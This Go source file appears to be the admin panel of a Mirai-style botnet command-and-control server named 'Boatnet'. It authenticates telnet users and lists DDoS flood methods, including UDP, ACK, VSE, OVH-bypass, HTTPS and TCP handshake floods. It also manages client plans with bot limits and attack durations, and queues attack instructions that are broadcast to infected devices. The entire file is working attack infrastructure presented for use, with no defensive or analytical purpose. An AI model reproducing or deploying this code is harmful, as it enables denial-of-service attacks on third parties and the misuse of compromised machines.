package main

import (
	"fmt"
	"net"
	"strconv"
	"strings"
	"time" 
	"log"
	"os" 
	"github.com/mattn/go-shellwords"
)
  
type Admin struct {
	conn net.Conn
}
 
func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
    this.conn.Write([]byte(fmt.Sprintf("\033]0; Boatnet\007")))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    var attackStatus int = 0
    attackStatusPointer := &attackStatus
 	
    // Get username
    this.conn.Write([]byte(fmt.Sprintf("\033]0; Boatnet\007")))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[38;5;033musername\033[38;5;244m:\033[37;1m "))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.Write([]byte(fmt.Sprintf("\033]0; Boatnet\007")))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[38;5;033mpassword\033[38;5;244m:\033[37;1m "))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}
 
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))

	var loggedIn bool
	var userInfo AccountInfo 
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte(fmt.Sprintf("\r\033[38;5;033mincorrect credentials\033[37;1m, \033[38;5;033myour ip was logged\033[38;5;244m:\033[37;1m %s\r\n", this.conn.RemoteAddr())))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	if len(username) > 0 && len(password) > 0 {
		log.SetFlags(log.LstdFlags)
		loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
		if err != nil {
			fmt.Println("Error: ", err)
		}
		success := "successful login"
		usernameFormat := "username:"
		passwordFormat := "password:"
		ipFormat := "ip:"
		cmdSplit := "|"  
		log.SetOutput(loginLogsOutput)
		log.Println(cmdSplit, success, cmdSplit, usernameFormat, username, cmdSplit, passwordFormat, password, cmdSplit, ipFormat, this.conn.RemoteAddr())
	}

	this.conn.Write([]byte("\r\n"))
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; Loaded: %d\007", BotCount))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()
	this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\x1b[37;01m             Добро пожаловать в терминал.\r\n"))
        this.conn.Write([]byte("\x1b[37;01m                        .--. \r\n")) 
        this.conn.Write([]byte("\x1b[37;01m                       |o_o | \r\n"))
        this.conn.Write([]byte("\x1b[37;01m                       |:_/ | \r\n"))
        this.conn.Write([]byte("\x1b[37;01m                      //   \\ \\ \r\n"))
        this.conn.Write([]byte("\x1b[37;01m                     (|     | ) \r\n"))
        this.conn.Write([]byte("\x1b[37;01m                    /'\\ _  _/`\\ \r\n"))
        this.conn.Write([]byte("\x1b[37;01m                    \\___)=(___/ \r\n"))
        this.conn.Write([]byte("\x1b[37;01m                     \r\n"))
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\r\n"))

	for {
		var botCatagory string
		var botCount int 
		this.conn.Write([]byte("\033[38;5;244m(\033[38;5;033m" + username + "\033[38;5;244m@\033[38;5;033mbotnet\033[38;5;244m)\033[38;5;033m~\033[38;5;244m#\033[38;5;033m:\033[37;1m "))
		cmd, err := this.ReadLine(false)  
		args, _ := shellwords.Parse(cmd)

		if cmd == "help" || cmd == "HELP" || cmd == "commands" {
			this.conn.Write([]byte("\033[38;5;244m---- \033[37;1mClient Commands \033[38;5;244m----\r\n\033[0m"))
			this.conn.Write([]byte("\033[38;5;033mfloods\033[38;5;244m:\033[37;1m displays all available floods.\r\n"))
			this.conn.Write([]byte("\033[38;5;033mclear\033[38;5;244m:\033[37;1m clears your terminal.\r\n"))
			this.conn.Write([]byte("\033[38;5;033mlogout\033[38;5;244m:\033[37;1m closes your connection to the cnc.\r\n"))
			this.conn.Write([]byte("\033[38;5;033mbots\033[38;5;244m:\033[37;1m displays total botcount & arch if detected.\r\n"))
			this.conn.Write([]byte("\033[38;5;033mplan\033[38;5;244m:\033[37;1m displays your plan information.\r\n"))
			this.conn.Write([]byte("\033[38;5;033mstats\033[38;5;244m:\033[37;1m displays all global stats for the cnc.\r\n"))
			this.conn.Write([]byte("\x1b\r\n"))  
			this.conn.Write([]byte("\033[38;5;244m---- \033[37;1mAdmin Commands \033[38;5;244m----\r\n\033[0m"))
			this.conn.Write([]byte("\033[38;5;033maddclient\033[38;5;244m:\033[37;1m create a new client account.\r\n"))
			this.conn.Write([]byte("\033[38;5;033maddadmin\033[38;5;244m:\033[37;1m create a new admin account.\r\n"))
			this.conn.Write([]byte("\033[38;5;033mrmuser\033[38;5;244m:\033[37;1m delete a account.\r\n"))
			this.conn.Write([]byte("\033[38;5;033mdisablefloods\033[38;5;244m:\033[37;1m disable floods.\r\n"))
			this.conn.Write([]byte("\033[38;5;033menablefloods\033[38;5;244m:\033[37;1m enable floods.\r\n"))
			continue
		}

		if cmd == "stats" || cmd == "STATS" || cmd == "statistics" || cmd == "STATISTICS" {
			this.conn.Write([]byte(fmt.Sprintf("\033[38;5;033mTotal Attacks Requested.\033[38;5;244m:\033[37;1m %d\r\n", database.retrieveTotalAttacks())))
			this.conn.Write([]byte(fmt.Sprintf("\033[38;5;033mTotal Database Users.\033[38;5;244m:\033[37;1m %d\r\n", database.retrieveTotalUsers())))
			this.conn.Write([]byte(fmt.Sprintf("\033[38;5;033mTotal Failed Logins.\033[38;5;244m:\033[37;1m %d\r\n", database.retrieveTotalFailedLogins())))
			this.conn.Write([]byte(fmt.Sprintf("\033[38;5;033mSuccesful Authentication.\033[38;5;244m:\033[37;1m %d\r\n", database.retrieveTotalSuccessfulLogins())))
			continue
		}

		if strings.Contains(cmd, "-") || strings.Contains(cmd, "@") || strings.Contains(username, "@") || strings.Contains(username, "-") || strings.Contains(password, "@") || strings.Contains(password, "-") {
			continue
		}
     
		if cmd == "floods" || cmd == "?" {
			this.conn.Write([]byte("\r\n\033[38;5;033mSyntax:\033[38;5;244m:\033[37;1m <method> <target> <duration> <options> (flags are optional.)\r\n"))
			this.conn.Write([]byte("\033[38;5;033mudp\033[38;5;244m       -\033[37;1m udp flood with less options & valid packets/data.\r\n"))
			this.conn.Write([]byte("\033[38;5;033mack\033[38;5;244m       -\033[37;1m ack flood with more options & fragmented packets.\r\n"))
			this.conn.Write([]byte("\033[38;5;033mraw\033[38;5;244m       -\033[37;1m raw floods turns traffic into false/encrypted pkts.\r\n"))
			this.conn.Write([]byte("\033[38;5;033mvse\033[38;5;244m       -\033[37;1m vse flood with more options & custom payload/tsource.\r\n"))
			this.conn.Write([]byte("\033[38;5;033mpps\033[38;5;244m       -\033[37;1m pps flood with more options & maximized packets/data.\r\n"))
			this.conn.Write([]byte("\033[38;5;033movh\033[38;5;244m       -\033[37;1m ovh flood with bypass strings & randomized sports.\r\n"))
			this.conn.Write([]byte("\033[38;5;033mnfo\033[38;5;244m       -\033[37;1m nfo flood with rtcp flag flood & randomized sports.\r\n"))
			this.conn.Write([]byte("\033[38;5;033mvtcp\033[38;5;244m      -\033[37;1m syn flood with more options & requests valid syn pkts.\r\n"))
			this.conn.Write([]byte("\033[38;5;033micmp\033[38;5;244m      -\033[37;1m icmp flood with less options & higher pps.\r\n")) 
			this.conn.Write([]byte("\033[38;5;033mhttps\033[38;5;244m     -\033[37;1m http flood revamped with ssl handshake/tls attack options.\r\n")) 
			this.conn.Write([]byte("\033[38;5;033mhandshake\033[38;5;244m -\033[37;1m initiate 3-way tcp handshake attack & send tcp fast open data.\r\n")) 
			continue
		}

		var botcountt int = clientList.Count()

		if cmd == "plan" || cmd == "PLAN" {
			this.conn.Write([]byte(fmt.Sprintf("\033[38;5;033musername\033[38;5;244m:\033[37;1m %s\r\n", database.retrieveUsername(username))))
			this.conn.Write([]byte(fmt.Sprintf("\033[38;5;033mduration\033[38;5;244m:\033[37;1m %d\r\n", database.retrieveDuration(username))))
			this.conn.Write([]byte(fmt.Sprintf("\033[38;5;033mcooldown\033[38;5;244m:\033[37;1m %d\r\n", database.retrieveCooldown(username))))
			this.conn.Write([]byte(fmt.Sprintf("\033[38;5;033mmax bots\033[38;5;244m:\033[37;1m %d\r\n", database.retrieveMaxBots(username, botcountt))))
			this.conn.Write([]byte(fmt.Sprintf("\033[38;5;033madmin\033[38;5;244m:\033[37;1m %s\r\n", database.retrieveAdmin(username))))
			continue
		}

        if attackStatus < 1 && userInfo.admin > 0 && cmd == "enablefloods" {
            this.conn.Write([]byte("\033[38;5;033mfloods are already enabled\033[37;1m.\r\n"))
            continue
        }
        if attackStatus > 0 && userInfo.admin > 0 && cmd == "disablefloods" {
            this.conn.Write([]byte("\033[38;5;033mfloods are already disabled\033[37;1m.\r\n"))
            continue
        }
        if attackStatus < 1 && userInfo.admin > 0 && cmd == "disablefloods" {
            this.conn.Write([]byte("\033[38;5;033mfloods successfully disabled\033[37;1m.\r\n"))
            *attackStatusPointer = 1
            continue
        }
        if attackStatus > 0 && userInfo.admin > 0 && cmd == "enablefloods" {
            this.conn.Write([]byte("\033[38;5;033mfloods successfully enabled\033[37;1m.\r\n"))
            *attackStatusPointer = 0
            continue
        }
        if attackStatus > 0 && strings.Contains(cmd, "handshake") || attackStatus > 0 && strings.Contains(cmd, "ack") || attackStatus > 0 && strings.Contains(cmd, "udp") || attackStatus > 0 && strings.Contains(cmd, "raw") || attackStatus > 0 && strings.Contains(cmd, "icmp") {
            this.conn.Write([]byte("\033[38;5;033mfloods are currently disabled\033[37;1m.\r\n"))
            continue
        }
  
		if cmd == "exit" || cmd == "quit" || cmd == "EXIT" || cmd == "QUIT" || cmd == "logout" || cmd == "LOGOUT" {
			return
		}

		if cmd == "" {
			continue
		}

		if cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "c" {
		this.conn.Write([]byte("\x1b[2J\x1b[1H"))
        this.conn.Write([]byte("\x1b\r\n"))
        this.conn.Write([]byte("\x1b[37;01m Успешно заверенная проверка, добро пожаловать\r\n"))         
        this.conn.Write([]byte("\x1b[37;01m                        .--. \r\n")) 
        this.conn.Write([]byte("\x1b[37;01m                       |o_o | \r\n"))
        this.conn.Write([]byte("\x1b[37;01m                       |:_/ | \r\n"))
        this.conn.Write([]byte("\x1b[37;01m                      //   \\ \\ \r\n"))
        this.conn.Write([]byte("\x1b[37;01m                     (|     | ) \r\n"))
        this.conn.Write([]byte("\x1b[37;01m                    /'\\ _  _/`\\ \r\n"))
        this.conn.Write([]byte("\x1b[37;01m                    \\___)=(___/ \r\n"))
        this.conn.Write([]byte("\x1b[37;01m                     \r\n"))
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\r\n"))
		continue
		}

		if len(cmd) > 0 {
			log.SetFlags(log.LstdFlags)
			output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
			if err != nil {
				fmt.Println("Error: ", err)
			}
			usernameFormat := "username:"
			cmdFormat := "command:"
			ipFormat := "ip:"
			cmdSplit := "|" 
			log.SetOutput(output)
			log.Println(cmdSplit, usernameFormat, username, cmdSplit, cmdFormat, cmd, cmdSplit, ipFormat, this.conn.RemoteAddr())
		}

		if userInfo.admin == 1 && len(cmd) > 0 {
			log.SetFlags(log.LstdFlags)
			adminLogsOutput, err := os.OpenFile("logs/adminlogs.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0667)
			if err != nil {
				fmt.Println("Error: ", err)
			}
			usernameFormat := "username:"
			cmdFormat := "command:"
			ipFormat := "ip:"
			cmdSplit := "|" 
			log.SetOutput(adminLogsOutput)
			log.Println(cmdSplit, usernameFormat, username, cmdSplit, cmdFormat, cmd, cmdSplit, ipFormat, this.conn.RemoteAddr())
		}
 
		botCount = userInfo.maxBots
 
		if userInfo.admin == 1 && cmd == "addclient" || userInfo.admin == 1 && cmd == "ADDCLIENT" {
			this.conn.Write([]byte("\033[38;5;033musername\033[38;5;244m:\033[37;1m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[38;5;033mpassword\033[38;5;244m:\033[37;1m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[38;5;033mbotcount \033[38;5;244m(\033[37;1m-1 for unlimited\033[38;5;244m)\033[37;1m: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", "\033[95mfailed to parse botcount\033[37;1m")))
				continue
			}
			this.conn.Write([]byte("\033[38;5;033mattack duration \033[38;5;244m(\033[37;1m-1 for 86400 seconds\033[38;5;244m)\033[37;1m: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", "\033[95mfailed to parse duration limit\033[37;1m")))
				continue
			}
			this.conn.Write([]byte("\033[38;5;033mcooldown \033[38;5;244m(\033[37;1m0 for no cooldown\033[38;5;244m)\033[37;1m: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", "\033[95mfailed to parse cooldown\033[37;1m")))
				continue
			}
			this.conn.Write([]byte("\033[38;5;033mnew user details\033[38;5;244m:\r\n\033[38;5;033musername\033[38;5;244m: \033[37;1m"+new_un+"\r\n\033[38;5;033mpassword\033[38;5;244m: \033[37;1m"+new_pw+"\r\n\033[38;5;033mmax bots\033[38;5;244m: \033[37;1m"+max_bots_str+"\r\n\033[38;5;033mduration\033[38;5;244m: \033[37;1m"+duration_str+"\r\n\033[38;5;033mcooldown\033[38;5;244m: \033[37;1m"+cooldown_str+"\r\n\r\n\033[38;5;033mwould you like to continue\033[37;1m? \033[38;5;244m(\033[32my\033[38;5;244m/\033[38;5;196mn\033[38;5;244m)\033[37;1m: "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", "\033[95mfailed to add new client\033[37;1m,\033[95m unknown error occured\033[37;1m.")))
			} else {
				this.conn.Write([]byte("\033[38;5;033msuccessfully added new client to the database\033[37;1m.\r\n"))
				fmt.Printf("admin: (" + username + ") successfully added a new client account (" + new_un + ") see more info at /root/logs/adminlogs.txt\r\n")
				log.SetFlags(log.LstdFlags)
				newClientOutput, err := os.OpenFile("logs/adminlogs.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0670)
				if err != nil {
					fmt.Println("Error: ", err)
				}
				message := "added a new client,"
				adminFormat := "admin:"
				usernameFormat := "username:"
				cmdSplit := "-"
				newUserFormat := "new user details:"
				passwordFormat := "password:"
				durationFormat := "duration:"
				botsFormat := "bots:"
				cooldownFormat := "cooldown:"
				log.SetOutput(newClientOutput)
				log.Println(cmdSplit, adminFormat, username, message, newUserFormat, usernameFormat, new_un, cmdSplit, passwordFormat, new_pw, cmdSplit, botsFormat, max_bots_str, cmdSplit, durationFormat, duration_str, cmdSplit, cooldownFormat, cooldown_str)
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "rmuser" || userInfo.admin == 1 && cmd == "RMUSER" {
			this.conn.Write([]byte("\033[38;5;033musername\033[38;5;244m:\033[37;1m "))
			rm_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[38;5;033mwarning\033[37;1m,\033[38;5;033m you are about to delete user\033[38;5;244m: \033[37;1m"+rm_un+"\r\n\033[38;5;033mwould you like to continue\033[37;1m? \033[38;5;244m(\033[32my\033[38;5;244m/\033[38;5;196mn\033[38;5;244m)\033[37;1m: "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.RemoveUser(rm_un) {
				this.conn.Write([]byte(fmt.Sprintf("\033[95mfailed to remove user\033[37;1m, \033[95munkown error occured\033[37;1m.\r\n")))
			} else {
				this.conn.Write([]byte("\033[38;5;033msuccessfully removed user from the database\033[37;1m.\r\n"))
			}
			continue
		} 

		if userInfo.admin == 1 && cmd == "addadmin" || userInfo.admin == 1 && cmd == "ADDADMIN" {
			this.conn.Write([]byte("\033[38;5;033musername\033[38;5;244m:\033[37;1m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[38;5;033mpassword\033[38;5;244m:\033[37;1m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[38;5;033mbotcount \033[38;5;244m(\033[37;1m-1 for unlimited\033[38;5;244m)\033[37;1m: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", "\033[95mfailed to parse botcount\033[37;1m")))
				continue
			}
			this.conn.Write([]byte("\033[38;5;033mattack duration \033[38;5;244m(\033[37;1m-1 for unlimited\033[38;5;244m)\033[37;1m: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", "\033[95mfailed to parse duration\033[37;1m")))
				continue
			}
			this.conn.Write([]byte("\033[38;5;033mcooldown \033[38;5;244m(\033[37;1m0 for no cooldown\033[38;5;244m)\033[37;1m: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", "\033[95mfailed to parse cooldown\033[37;1m")))
				continue
			}
			this.conn.Write([]byte("\033[38;5;033mnew user details\033[38;5;244m:\r\n\033[38;5;033musername\033[38;5;244m: \033[37;1m"+new_un+"\r\n\033[38;5;033mpassword\033[38;5;244m: \033[37;1m"+new_pw+"\r\n\033[38;5;033mmax bots\033[38;5;244m: \033[37;1m"+max_bots_str+"\r\n\033[38;5;033mduration\033[38;5;244m: \033[37;1m"+duration_str+"\r\n\033[38;5;033mcooldown\033[38;5;244m: \033[37;1m"+cooldown_str+"\r\n\r\n\033[38;5;033mwould you like to continue\033[37;1m? \033[38;5;244m(\033[32my\033[38;5;244m/\033[38;5;196mn\033[38;5;244m)\033[37;1m: "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", "\033[95mfailed to add new admin\033[37;1m,\033[95m unknown error occured\033[37;1m.")))
			} else {
				this.conn.Write([]byte("\033[38;5;033msuccessfully added new admin to the database\033[37;1m.\r\n"))
				fmt.Printf("admin: (" + username + ") successfully added a new admin account (" + new_un + ") see more info at /root/logs/adminlogs.txt\r\n")
				log.SetFlags(log.LstdFlags)
				newAdminOutput, err := os.OpenFile("logs/adminlogs.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0670)
				if err != nil {
					fmt.Println("Error: ", err)
				}
				message := "added a new admin,"
				adminFormat := "admin:"
				usernameFormat := "username:"
				cmdSplit := "-"
				newUserFormat := "new user details:"
				passwordFormat := "password:"
				durationFormat := "duration:"
				botsFormat := "bots:"
				cooldownFormat := "cooldown:"
				log.SetOutput(newAdminOutput)
				log.Println(cmdSplit, adminFormat, username, message, newUserFormat, usernameFormat, new_un, cmdSplit, passwordFormat, new_pw, cmdSplit, botsFormat, max_bots_str, cmdSplit, durationFormat, duration_str, cmdSplit, cooldownFormat, cooldown_str)
			}
			continue
		}

		if cmd == "BOTS" || cmd == "bots" {
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\033[38;5;033m%s\033[38;5;244m: \033[37;1m%d\r\n", k, v)))
			}
			this.conn.Write([]byte(fmt.Sprintf("\033[38;5;033mtotal\033[38;5;244m: \033[37;1m%d\r\n", botCount)))
			continue
		}
		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("failed to parse botcount \"%s\"\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("specified botcount is larger then your assigned botcount.\r\n")))
				continue
			}
			cmd = countSplit[1]
		}
		if cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					var deviceCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        deviceCount = userInfo.maxBots
                    } else {
                        deviceCount = clientList.Count()
                    }
                    this.conn.Write([]byte(fmt.Sprintf("Requested An %s To %s For: %s Seconds..\r\n", args[0], args[1], args[2])))
                    this.conn.Write([]byte(fmt.Sprintf("Broadcasted Instructions To %d Devices.\r\n", deviceCount)))
				} else {
					fmt.Println("blocked attack by " + username + " to whitelisted host.")
				}
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 55555)
	bufPos := 0
	for {
		if len(buf) < bufPos+2 { 
			fmt.Println("Shitty Bufferoverflow Attack Prevented IP - :", this.conn.RemoteAddr())
			return string(buf), nil
		}

		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
